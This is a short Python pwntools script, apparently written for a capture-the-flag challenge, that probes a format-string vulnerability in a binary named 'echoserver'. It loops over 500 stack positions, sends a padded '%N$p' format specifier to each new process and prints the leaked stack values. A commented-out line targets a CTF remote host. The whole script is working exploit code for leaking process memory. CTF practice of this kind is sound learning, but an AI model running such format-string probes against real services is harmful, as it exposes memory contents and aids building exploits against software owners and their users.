from pwn import *
elf = ELF('./echoserver', checksec=False)
#
for x in range(1, 501):
    with context.local(log_level = 'error'):
        p = elf.process()
        #p = remote('challenges.ctfd.io', 30095)
        p.sendlineafter(b'\n', b'A'*13 + '%{:d}$p\x00'.format(x).encode())
        p.recvlines(2)
        print(x,p.recvline().decode().strip())
        p.close()
#p.interactive()